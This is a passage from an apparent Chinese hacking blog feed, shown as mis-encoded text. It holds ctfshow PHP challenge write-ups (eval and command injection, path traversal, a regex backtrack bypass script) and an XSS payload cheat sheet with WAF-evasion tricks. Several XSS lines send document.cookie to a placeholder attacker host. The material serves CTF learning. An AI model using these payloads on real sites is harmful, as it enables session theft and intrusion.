title="web126"></a>web126</h3><p>ç›´æ¥è¿‡æ»¤äº†gã€iã€fâ€¦ï¼Œè¦åˆ©ç”¨$_SERVER[â€˜argvâ€™]ã€‚</p><p><em>$_SERVER</em> æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p><strong>$_SERVER[â€˜argvâ€™][0] &#x3D; $_SERVER[â€˜QUERY_STRINGâ€™]</strong><br>query stringæ˜¯Uniform Resource Locator (URL)çš„ä¸€éƒ¨åˆ†, å…¶ä¸­åŒ…å«ç€éœ€è¦ä¼ ç»™web applicationçš„æ•°æ®</p><p>å¯ä»¥ç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ³¨ï¼šåœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹</p><pre><code>payload GET a=1+$fl0g=flag_give_me;        POST CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=eval($a[1])</code></pre><p>æ³¨æ„åˆ†å·ã€‚</p><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><p><strong>extract(array &amp;$array, int $flags &#x3D; EXTR_OVERWRITE, string $prefix&#x3D; â€œâ€): int</strong></p><p>æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚</p><p>array:ä¸€ä¸ªå…³è”æ•°ç»„ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚ å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡</p><p>è¿™ä¸€å…³ä¸€ç›´å¡åœ¨CTF_SHOWçš„ä¸‹åˆ’çº¿çš„è¿‡æ»¤ä¸Šï¼Œçœ‹åˆ«äººé¢˜è§£æ‰å‘ç°è¿˜æœ‰ä¸ªç©ºæ ¼æ²¡ç”¨ä¸Š</p><pre><code>payload ?ctf show=ilove36d</code></pre><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><p>è¿™å…³æ“ä½œç¡®å®æœ‰ç‚¹éªšã€‚ã€‚ã€‚</p><p>å¤è¿°ä¸€ä¸‹å¤§ä½¬çš„åšæ³•ï¼šï¼ˆåšè¿™é“é¢˜çš„æ—¶å€™æ­£å¥½å †å †æ¨é—¨è€Œå…¥å–æ°´æ¥äº†ï¼Œä¸å¾—è®©ä»–è¡¨æ¼”ä¸€ä¸‹ã€‚ã€‚ã€‚ä¸è¿‡å¤§ä½¬å°±æ˜¯å¤§ä½¬ï¼‰</p><p>ä½¿ç”¨**gettext()**æ‹“å±•ï¼Œå¼€å¯æ­¤æ‹“å±•_() ç­‰æ•ˆäº gettext()</p><pre><code>echo _(&quot;hahahaha&quot;);//è¾“å‡ºç»“æœï¼šhahahaha</code></pre><p>æ¥ä¸‹æ¥åˆ°ç¬¬äºŒå±‚call_user_funcï¼Œå¯ä»¥ä½¿ç”¨get_defined_varså‡½æ•°</p><p><strong>get_defined_vars ( void ) : array</strong> å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</p><pre><code>payload ?f1=_&amp;f2=get_defined_vars</code></pre><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><p>è¿™é¢˜çœ‹åˆ°readfileç¬¬ä¸€ååº”æ˜¯phpä¼ªåè®®ï¼Œä½†è¦åŒ…æ‹¬ctfshowï¼Œæäº†ä¸€ä¼šä¸è¡Œï¼Œçœ‹åˆ«äººé¢˜è§£å‘ç°æ”¾åˆ°è¿‡æ»¤å™¨å‚æ•°é‡Œå°±å¯ä»¥ï¼Œæ— æ•ˆçš„ä¸œè¥¿ä¼šè¢«å¿½ç•¥</p><pre><code>payload f=php://filter/ctfshow/resource=flag.php</code></pre><p>è§£æ³•2ï¼šæ–‡ä»¶ç©¿è¶Šï¼ŒæŠŠctfshowå½“ä½œå½“å‰ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶</p><pre><code>?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</code></pre><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><p>ç¬¬ä¸€ä¸‹éšä¾¿ä¼ äº†ä¸ªf&#x3D;ctfshowæƒ³è¯•è¯•ä»£ç ä¸­çš„æ­£åˆ™æ˜¯ä»€ä¹ˆä½œç”¨ï¼Œç»“æœçˆ†å‡ºäº†flagã€‚ã€‚ã€‚</p><p>.è¡¨ç¤ºä»»æ„å•ä¸ªå­—ç¬¦ï¼Œ+è¡¨ç¤ºå¿…é¡»åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡ï¼Œï¼Ÿè¡¨ç¤ºåŒ¹é…0æ¬¡æˆ–1æ¬¡Â·ï¼Œæ‰€ä»¥+?è¡¨ç¤º é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡</p><pre><code>payload f=ctfshow</code></pre><p>è¿˜æœ‰ä¸€ç§åšæ³•ï¼šé€šè¿‡æ•°ç»„æ¥ç»•è¿‡ï¼Œstriposåº”ç”¨äºæ•°ç»„çš„æ—¶å€™ä¼šè¿”å›nullï¼Œnull!&#x3D;&#x3D;false</p><pre><code>payload f[]=1</code></pre><p>å…¶å®è¿™é“é¢˜çš„æ„å›¾æ˜¯é€šè¿‡å›æº¯é™åˆ¶æ¥ç»•è¿‡ã€‚</p><p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ false</p><p>è„šæœ¬å‘åŒ…ï¼š</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;ctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><p>è¿™ä¸€å…³åªèƒ½ç”¨å›æº¯äº†</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;36Dctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>è¿›å…¥adminç›®å½•</p><p>&amp;&amp;ä¼˜å…ˆçº§é«˜äº||ï¼Œæ‰€ä»¥</p><pre><code>paylaod ?username=admin&amp;code=admin&amp;password=fdsf</code></pre><h3 id="web133"><a href="#web133" class="headerlink" title="***web133"></a>***web133</h3><p>è¿™é¢˜çœ‹çœ‹å‡ºé¢˜äººçš„åšå®¢ <a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><pre><code>æˆ‘ä»¬ä¼ é€’?F=`$F`;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„`$F`;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„`$F`;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯``$F`;+sleep 3`,å°±æ‰§è¡ŒæˆåŠŸè¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</code></pre><p><strong>shell_exec</strong> â€” é€šè¿‡ shell æ‰§è¡Œå‘½ä»¤å¹¶å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›</p><p>æ‰€ä»¥è¿™é‡Œæ²¡åŠæ³•å›æ˜¾</p><p>è¿™ä¸€å…³è¦å¼¹ä»€ä¹ˆshellï¼Œä»¥åå†çœ‹</p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>å¦‚æœ string æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚ï¼ˆparse_strä»¥&amp;æ¥åˆ†å‰²å­—ç¬¦ä¸²ï¼‰</p><pre><code>payload ?_POST[key1]=36d&amp;_POST[key2]=36d</code></pre><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><p>è¿™ä¸€å…³å±è”½äº†å¾ˆå¤šä¸œè¥¿ï¼Œæˆ‘ä»¬ç”¨linuxå‘½ä»¤cpæˆ–uniq</p><pre><code>payload ?F=`$F` ;cp flag.php 2.txt;         ?F=`$F` ;uniq flag.php&gt;4.txt;</code></pre><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><p><strong>exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code&#x3D; null): string|false</strong></p><p>exec()æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚</p><p>è¿™å…³å±è”½äº†&lt;&gt;å’Œ.ï¼Œåˆæ¥ä¸€ä¸ªæ–°å§¿åŠ¿ï¼š</p><pre><code>tee a.txt b.txtï¼Œå°†a.txtå¤åˆ¶åˆ°b.txt ls | tee b.txt,å°†lså‘½ä»¤çš„æ‰§è¡Œç»“æœå†™å…¥b.txt</code></pre><p>å…ˆæ‰§è¡Œ?c&#x3D;ls &#x2F;|tee ls,ç„¶åè®¿é—®ls.txt</p><p>ä¼šè®©ä½ ä¸‹è½½æ–‡ä»¶ï¼Œ</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/135803.png" class=""><p>ç„¶åæ‰§è¡Œ ?c&#x3D;tac &#x2F;f149_15_h3r3|tee flagï¼Œè®¿é—®&#x2F;flag</p><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><p>ç”¨**call_user_func()**æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•</p><pre><code>payload ctfshow=ctfshow::getFlag</code></pre><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><p>å±è”½äº†å†’å·ï¼Œè¿˜å¯ä»¥ç”¨æ•°ç»„æ¥è°ƒç”¨ç±»é‡Œçš„æ–¹æ³•</p><pre><code>payload ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></pre><h3 id="web139"><a href="#web139" class="headerlink" title="***web139"></a>***web139</h3><p>è¦ç”¨åˆ°ä»€ä¹ˆshellç¼–ç¨‹å’Œç›²æ³¨ï¼Œè¿˜æ˜¯æš‚æ”¾äº¿ä¸‹ã€‚ã€‚ã€‚</p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><p>â€œctfshowâ€å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¶è¢«è½¬æ¢ä¸º0ï¼Œæ‰€ä»¥è¿™å…³éšä¾¿èƒ¡å†™ä¿©ä¸ªå‡½æ•°ä½¿æœ€åçš„ç»“æœä¸ºnullå°±è¡Œ</p><pre><code>payload f1=intval&amp;f2=intval</code></pre><h3 id="web141"><a href="#web141" class="headerlink" title="***web141"></a>***web141</h3><p>\WåŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº [^A-Za-z0-9_]ã€‚</p><p>æ— æ•°å­—å­—æ¯rceâ€¦â€¦</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>è¿™å…³æ²¡éš¾åº¦</p><pre><code>payload v1=0</code></pre><h3 id="web143-150"><a href="#web143-150" class="headerlink" title="***web143-150"></a>***web143-150</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2023/03/28/xss/"/>
      <url>/2023/03/28/xss/</url>
      
        <content type="html"><![CDATA[<p>xssç±»å‹ï¼š</p><p>â€‹åå°„å‹</p><p>â€‹å­˜å‚¨å‹</p><p>â€‹DOMå‹ï¼ˆdocument.writeã€innerHTMLã€evalï¼‰</p><p>æ³¨ï¼šdocument.writeå¯ä»¥è¯†åˆ«Nativeç¼–ç </p><p>åŒæºç­–ç•¥ï¼šåŒåè®®ï¼ŒåŒåŸŸåï¼ŒåŒç«¯å£</p><pre><code>æ ‡ç­¾æ³•ï¼š&lt;script&gt;alert(123)&lt;/script&gt;ä¼ªåè®®ï¼š&lt;a href=javascript:alert(555)&gt;&lt;/a&gt;äº‹ä»¶æ³•ï¼š&lt;a onmousemove=alert(888)&gt;8888&lt;a&gt;</code></pre><h3 id="æ— è¿‡æ»¤æƒ…å†µ"><a href="#æ— è¿‡æ»¤æƒ…å†µ" class="headerlink" title="æ— è¿‡æ»¤æƒ…å†µ"></a>æ— è¿‡æ»¤æƒ…å†µ</h3><p>&lt;script&gt;</p><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://xxx.xxx:xxxx/&quot;+document.cookie&lt;/script&gt;  //å¤–å¸¦&lt;script&gt;window.open(&quot;http://xxx.xxx:xxxx/&quot;+document.cookie)&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;</code></pre><p>&lt;img&gt;</p><pre><code>å›¾ç‰‡åŠ è½½é”™è¯¯æ—¶è§¦å‘&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°å…ƒç´ æ—¶è§¦å‘&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;é¼ æ ‡æŒ‡é’ˆç§»å‡ºæ—¶è§¦å‘&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;a&gt;</p><pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;</code></pre><p>&lt;input&gt;</p><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶&lt;input onfocus=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot; autofocus&gt; //å¤–å¸¦&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;æŒ‰ä¸‹æŒ‰é”®æ—¶è§¦å‘&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;æŒ‰ä¸‹æŒ‰é”®æ—¶è§¦å‘&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;æ¾å¼€æŒ‰é”®å¼æ—¶è§¦å‘&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;from&gt;</p><pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;&lt;form action=1 onmouseover=alert(&#39;xss)&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>&lt;iframe&gt;</p><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; //å¤–å¸¦&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````åªæœ‰ä¸¤ä¸ª``)</code></pre><p>&lt;svg&gt;</p><pre><code>&lt;svg onload=alert(1)&gt;&lt;svg onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;</code></pre><p>&lt;body&gt;</p><pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;&lt;body onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt; //å¤–å¸¦åˆ©ç”¨æ¢è¡Œç¬¦ä»¥åŠautofocusï¼Œè‡ªåŠ¨å»è§¦å‘onscrolläº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><p>&lt;button&gt;</p><pre><code>å…ƒç´ ä¸Šç‚¹å‡»é¼ æ ‡æ—¶è§¦å‘&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code></pre><p>&lt;p&gt;</p><pre><code>å…ƒç´ ä¸ŠæŒ‰ä¸‹é¼ æ ‡æ—¶è§¦å‘&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;å…ƒç´ ä¸Šé‡Šæ”¾é¼ æ ‡æ—¶è§¦å‘&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;details&gt;</p><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;ä½¿ç”¨openå±æ€§è§¦å‘ontoggleäº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;å…ƒç´ ä¸ŠæŒ‰ä¸‹é¼ æ ‡æ—¶è§¦å‘&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;å…ƒç´ ä¸Šé‡Šæ”¾é¼ æ ‡æ—¶è§¦å‘&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;select&gt;</p><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘&lt;select onfocus=alert(1) autofocus&gt;</code></pre><p>&lt;video&gt;</p><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;audio&gt;</p><pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>&lt;textarea&gt;</p><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><p>&lt;keygen&gt;</p><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //ä»…é™ç«ç‹</code></pre><p>&lt;marquee&gt;</p><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥</code></pre><p>&lt;isindex&gt;</p><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//ä»…é™äºIE</code></pre><p>åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶</p><pre><code>åœ¨æ— CSPçš„æƒ…å†µä¸‹æ‰å¯ä»¥&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><p>javascriptä¼ªåè®®</p><pre><code>&lt;a&gt;æ ‡ç­¾&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;&lt;iframe&gt;æ ‡ç­¾&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;&lt;img&gt;æ ‡ç­¾&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7ä»¥ä¸‹&lt;form&gt;æ ‡ç­¾&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><p>expressionå±æ€§</p><pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7ä»¥ä¸‹&lt;div style=&quot;color:rgb(&#39;&#39;ï¿½x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7ä»¥ä¸‹&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7ä»¥ä¸‹</code></pre><p>backgroundå±æ€§</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //åœ¨Opera 10.5å’ŒIE6ä¸Šæœ‰æ•ˆ</code></pre><h3 id="å­˜åœ¨è¿‡æ»¤æƒ…å†µ"><a href="#å­˜åœ¨è¿‡æ»¤æƒ…å†µ" class="headerlink" title="å­˜åœ¨è¿‡æ»¤æƒ…å†µ"></a>å­˜åœ¨è¿‡æ»¤æƒ…å†µ</h3><p>è¿‡æ»¤ç©ºæ ¼</p><pre><code>ç”¨ / ä»£æ›¿ç©ºæ ¼&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>è¿‡æ»¤å…³é”®å­—</p><pre><code>å¤§å°å†™ç»•è¿‡&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;åŒå†™å…³é”®å­—(æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡)&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;å­—ç¬¦æ‹¼æ¥(åˆ©ç”¨eval)&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;å­—ç¬¦æ‹¼æ¥(åˆ©ç”¨top)&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(åªæœ‰ä¸¤ä¸ª``è¿™é‡Œæ˜¯ä¸ºäº†å‡¸æ˜¾å‡ºæœ‰`ç¬¦å·)</code></pre><p>å…¶ä»–å­—ç¬¦æ··æ·†</p><pre><code>æœ‰çš„wafå¯èƒ½æ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼å»æ£€æµ‹æ˜¯å¦æœ‰xssæ”»å‡»ï¼Œå¦‚æœæˆ‘ä»¬èƒ½fuzzå‡ºæ­£åˆ™çš„è§„åˆ™ï¼Œåˆ™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å…¶å®ƒå­—ç¬¦å»æ··æ·†æˆ‘ä»¬æ³¨å…¥çš„ä»£ç äº†ä¸‹é¢ä¸¾å‡ ä¸ªç®€å•çš„ä¾‹å­å¯åˆ©ç”¨æ³¨é‡Šã€æ ‡ç­¾çš„ä¼˜å…ˆçº§ç­‰&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; å› ä¸ºtitleæ ‡ç­¾çš„ä¼˜å…ˆçº§æ¯”imgçš„é«˜ï¼Œæ‰€ä»¥ä¼šå…ˆé—­åˆtitleï¼Œä»è€Œå¯¼è‡´å‰é¢çš„imgæ ‡ç­¾æ— æ•ˆ&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p>ç¼–ç ç»•è¿‡</p><pre><code>Unicodeç¼–ç ç»•è¿‡&lt;img 